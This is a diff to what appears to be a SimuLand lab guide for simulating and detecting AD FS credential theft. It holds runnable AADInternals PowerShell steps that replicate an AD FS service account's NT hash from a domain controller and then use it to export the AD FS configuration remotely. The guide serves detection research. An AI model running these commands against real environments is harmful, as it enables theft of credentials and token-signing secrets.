@@ -173,28 +173,25 @@ Import-Module –Name AADInternals
 
 ### Get NTHash of AD FS Service Account via Directory Replication Services (DSR)
 
-5. Get the NTHash of the AD FS service account. AADInternals accomplishes this via [Active Directory Replication Services (DRS)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/06205d97-30da-4fdc-a276-3fd831b272e0#:~:text=The%20Directory%20Replication%20Service%20%28DRS%29%20Remote%20Protocol%20is,name%20of%20each%20dsaop%20method%20begins%20with%20%22IDL_DSA%22.) with the [Get-AADIntADUserNTHash](https://github.com/Gerenios/AADInternals/blob/master/DRS_Utils.ps1#L71) function. 
+5. Get the NTHash of the AD FS service account. AADInternals accomplishes this via [Active Directory Replication Services (DRS)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/06205d97-30da-4fdc-a276-3fd831b272e0#:~:text=The%20Directory%20Replication%20Service%20%28DRS%29%20Remote%20Protocol%20is,name%20of%20each%20dsaop%20method%20begins%20with%20%22IDL_DSA%22.) with the [Get-AADIntADUserNTHash](https://github.com/Gerenios/AADInternals/blob/master/DRS_Utils.ps1#L71) function. Make sure you set the right name for the domain controller in your environment (`$Server`).
 
 ```PowerShell
-$ObjectGuid = '5e1ede45-89cb-4ddc-b300-968484f7175b'
-$ObjectSid = 'S-1-5-21-2490359158-13971675-3780420524-1103'
 $Server = 'DC01.simulandlabs.com'
-$cred = Get-Credential
+$creds = Get-Credential
 
-Get-AADIntADUserNTHash –ObjectGuid $ObjectGuid –Credentials $creds –Server $Server -AsHex 
+$NTHash = Get-AADIntADUserNTHash –ObjectGuid $Object.ObjectGuid –Credentials $creds –Server $Server -AsHex
+$NTHash
 ```
 
 ![](../../resources/images/simulate_detect/credential-access/exportADFSTokenSigningCertificate/2021-05-19_06_get_adfs_service_account_nthash.png)
 
 ### Get AD FS Configuration Settings Remotely
 
-6.  Finally, we can use all the previous information to export the AD FS configuration settings remotely. 
+6.  Finally, we can use all the previous information to export the AD FS configuration settings remotely. Make sure you set the right name for the AD FS server in your environment (`$ADFSServer`).
 
 ```PowerShell
-$NTHash = "2d89f51237b6072aa1f45183c67cbb36" 
-$ObjectSid = "S-1-5-21-2490359158-13971675-3780420524-1103" 
 $ADFSServer = "ADFS01.simulandlabs.com" 
-$settings = Export-AADIntADFSConfiguration -Hash $NTHash -SID $ObjectSid -Server $ADFSServer
+$settings = Export-AADIntADFSConfiguration -Hash $NTHash -SID $Object.ObjectSid -Server $ADFSServer
 $settings 
 ```
 
